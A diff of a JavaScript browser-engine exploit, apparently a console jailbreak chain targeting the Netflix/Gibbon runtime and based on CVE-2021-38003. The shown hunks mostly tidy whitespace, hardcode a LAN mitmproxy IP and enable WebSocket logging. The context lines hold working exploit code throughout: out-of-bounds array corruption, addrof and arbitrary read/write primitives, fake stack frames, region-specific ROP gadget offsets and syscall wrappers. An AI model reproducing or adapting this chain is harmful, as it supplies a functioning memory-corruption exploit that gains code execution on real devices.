@@ -2,7 +2,7 @@
 // based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
 // thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html
 
-const ip_script = "PLS_STOP_HARDCODING_IPS"; // IP address of computer running mitmproxy.. MITM Proxy is handling it --> Needs to be updated
+const ip_script = "192.168.1.169"; // IP address of computer running mitmproxy.. MITM Proxy is handling it --> Needs to be updated
 const ip_script_port = 8080; //port which mitmproxy is running on
 // #region misc
 
@@ -396,8 +396,8 @@ gadgets_eu_6 = {
     pop_rsp_pop_rbp:       0x17ecb4en,
     mov_qword_ptr_rdi_rax: 0x1dcba9n,
     mov_qword_ptr_rdi_rdx: 0x36db4en,
-    
-    
+
+
     /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
     mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
                                                         // the jne is neved executed if the value in rsi does not end in 1
@@ -423,8 +423,8 @@ gadgets_us_5 = {
     pop_rsp_pop_rbp:       0x17ecb4en,
     mov_qword_ptr_rdi_rax: 0x1dcba9n,
     mov_qword_ptr_rdi_rdx: 0x36db4en,
-    
-    
+
+
     /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
     mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
                                                         // the jne is neved executed if the value in rsi does not end in 1
@@ -498,7 +498,7 @@ function main () {
         map1.set(0x10, -1);
         nrdp.gibbon.garbageCollect();
         map1.set(oob_arr_temp, 0x200);
-        
+
 
         if (oob_arr_temp.lenght < 4) {
             throw new Error("Could not create unstable primitives. Try again.");
@@ -540,7 +540,7 @@ function main () {
             let original_value_26 = oob_arr[26];
 
             let external_ptr_org_63_32 = (oob_arr[26] & 0xffffffffn);
-            
+
             oob_arr[25] = (original_value_25 & 0xffffffffn) + (add_32 << 32n);
             oob_arr[26] = external_ptr_org_63_32; // re-use upper32 bits of heap from external_ptr, base_ptr 0
 
@@ -567,7 +567,7 @@ function main () {
 
             oob_arr[25] = original_value_25;
             oob_arr[26] = original_value_26;
-        }     
+        }
 
         function read32_unstable(add){
             let read = read64_unstable(add);
@@ -578,9 +578,9 @@ function main () {
             let read = read64_unstable(add);
             let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
             write64_unstable(add, new_value);
-        }      
-        
-        
+        }
+
+
         let add_string = addrof_unstable(string) + 12n;
         logger.log("Address of 'string' text: " + hex(add_string));
         let string_value = read32_unstable(add_string);
@@ -708,7 +708,7 @@ function main () {
         /***** fake_rop_arr buffer:     0x1700             *****/
         /***** fake_rop_arr elements:   0x1600             *****/
         /*******************************************************/
-       
+
         // Inside fake_rw_data: fake Array's elements (at the beginning)
         const fake_rw_obj =             base + 0x0000n;
         const fake_rw_obj_buffer =      base + 0x0040n;
@@ -905,7 +905,7 @@ function main () {
           write64(add, new_value);
         }
 
-        /***** The following primitives r/w a full 64bits Add *****/        
+        /***** The following primitives r/w a full 64bits Add *****/
 
         function read64_uncompressed (add) {
           let original_value = fake_rw[21];
@@ -991,7 +991,7 @@ function main () {
         //logger.log("This is the add of function 'rop_smash': " + hex(add_rop_smash) );
         add_rop_smash_sharedfunctioninfo = read32(add_rop_smash + 0x0Cn) -1n;
         add_rop_smash_code = read32(add_rop_smash_sharedfunctioninfo + 0x04n) -1n;
-        add_rop_smash_code_store = add_rop_smash_code + 0x22n;        
+        add_rop_smash_code_store = add_rop_smash_code + 0x22n;
 
         //logger.log("Address of fake_frame: 0x" + hex(base_heap_add + fake_frame) );
         //logger.log("Address of fake_bytecode: " + hex(base_heap_add + fake_bytecode) );
@@ -1019,9 +1019,9 @@ function main () {
 
         write64(fake_frame  - 0x20n, base_heap_add + fake_bytecode);  // Put the return code (by pointer) in R14
                                                                     // this is gonna be offseted by R9
-        write64(fake_frame  - 0x28n, 0x00n);                    // Force the value of R9 = 0                                                                          
+        write64(fake_frame  - 0x28n, 0x00n);                    // Force the value of R9 = 0
         write64(fake_frame  - 0x18n, 0xff00000000000000n); // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
-                                                                          
+
         write64(fake_frame + 0x08n, g.get('pop_rsp')); // pop rsp ; ret --> this change the stack pointer to your stack
         write64(fake_frame + 0x10n, rop_address);
 
@@ -1067,7 +1067,7 @@ function main () {
             fake_rop[i++] = 0x2000n;                   // Fake value in RAX to make JS happy
             fake_rop[i++] = g.get('pop_rsp_pop_rbp');
             fake_rop[i++] = real_rbp;
-            
+
             write64(add_rop_smash_code_store, 0xab00260325n);
             oob_arr[39] = base_heap_add + fake_frame;
             rop_smash(obj_arr[0]);          // Call ROP
@@ -1135,7 +1135,7 @@ function main () {
 
         const mod_info = malloc(0x300);
         const SEGMENTS_OFFSET = 0x160n;
-        
+
         ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
         logger.log("sceKernelGetModuleInfoFromAddr returned: " + hex(ret));
 
@@ -1143,24 +1143,24 @@ function main () {
             logger.log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + hex(ret));
             throw new Error("sceKernelGetModuleInfoFromAddr failed");
         }
-        
+
         /***** LibKernel *****/
         libkernel_base = read64_uncompressed(mod_info + SEGMENTS_OFFSET);
         logger.log("libkernel_base @ " + hex(libkernel_base));
         logger.flush();
 
-        function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) 
-        {            
+        function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n)
+        {
             call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
             return read64(fake_rop_return);
         }
 
-        function write_string(addr, str) {            
+        function write_string(addr, str) {
             let bytes = stringToBytes(str);
             for (let i = 0; i < str.length; i++) {
                 write8_uncompressed(addr + BigInt(i), bytes[i]);
             }
-            
+
             write8_uncompressed(addr + BigInt(str.length), 0);
         }
 
@@ -1170,9 +1170,9 @@ function main () {
             for (let i = 0; i < str.length; i++) {
                 write8_uncompressed(addr + BigInt(i), bytes[i]);
             }
-            
+
             write8_uncompressed(addr + BigInt(str.length), 0);
-            
+
             return addr;
         }
 
@@ -1180,31 +1180,31 @@ function main () {
             const notify_buffer_size = 0xc30n;
             const notify_buffer = malloc(Number(notify_buffer_size));
             const icon_uri = "cxml://psnotification/tex_icon_system";
-                                
+
             // Setup notification structure
             write32_uncompressed(notify_buffer + 0x0n, 0);           // type
             write32_uncompressed(notify_buffer + 0x28n, 0);          // unk3
             write32_uncompressed(notify_buffer + 0x2cn, 1);          // use_icon_image_uri
             write32_uncompressed(notify_buffer + 0x10n, 0xffffffff); // target_id (-1 as unsigned)
-            
+
             // Write message at offset 0x2D
             write_string(notify_buffer + 0x2dn, text);
-            
+
             // Write icon URI at offset 0x42D
             write_string(notify_buffer + 0x42dn, icon_uri);
-            
+
             // Open /dev/notification0
             const dev_path = alloc_string("/dev/notification0");
             const fd = syscall(SYSCALL.open, dev_path, O_WRONLY);
-            
+
             if (Number(fd) < 0) {
                 return;
             }
-            
+
             syscall(SYSCALL.write, fd, notify_buffer, notify_buffer_size);
-            syscall(SYSCALL.close, fd);  
+            syscall(SYSCALL.close, fd);
         }
-        
+
         if (typeof TextDecoder === "undefined") {
                 class _UTF8Decoder {
                     decode(bytes) {
@@ -1450,20 +1450,20 @@ function main () {
             if (count < 0) {
                 return null;
             }
-            
+
             // Allocate buffer for interfaces
             const iface_size = 0x1e0;
             const iface_buf = malloc(iface_size * count);
-            
+
             // Get interface list
             if (Number(syscall(SYSCALL.netgetiflist, iface_buf, BigInt(count))) < 0) {
                 return null;
             }
-            
+
             // Parse interfaces
             for (let i = 0; i < count; i++) {
                 const offset = BigInt(i * iface_size);
-                
+
                 // Read interface name (null-terminated string at offset 0)
                 let iface_name = "";
                 for (let j = 0; j < 16; j++) {
@@ -1471,7 +1471,7 @@ function main () {
                     if (c === 0) break;
                     iface_name += String.fromCharCode(c);
                 }
-                
+
                 // Read IP address (4 bytes at offset 0x28)
                 const ip_offset = offset + 0x28n;
                 const ip1 = Number(read8_uncompressed(iface_buf + ip_offset));
@@ -1479,14 +1479,14 @@ function main () {
                 const ip3 = Number(read8_uncompressed(iface_buf + ip_offset + 2n));
                 const ip4 = Number(read8_uncompressed(iface_buf + ip_offset + 3n));
                 const iface_ip = ip1 + "." + ip2 + "." + ip3 + "." + ip4;
-                
+
                 // Check if this is eth0 or wlan0 with valid IP
-                if ((iface_name === "eth0" || iface_name === "wlan0") && 
+                if ((iface_name === "eth0" || iface_name === "wlan0") &&
                     iface_ip !== "0.0.0.0" && iface_ip !== "127.0.0.1") {
                     return iface_ip;
                 }
             }
-            
+
             return null;
         }
 
@@ -1617,5 +1617,5 @@ function main () {
     }
 }
 
-//ws.init(ip_script, 1337, () => { logger.log("Websocket initiated successfully"); main();});// uncomment this to enable WebSocket logging
+ws.init(ip_script, 1337, () => { logger.log("Websocket initiated successfully"); main();});// uncomment this to enable WebSocket logging
 main();
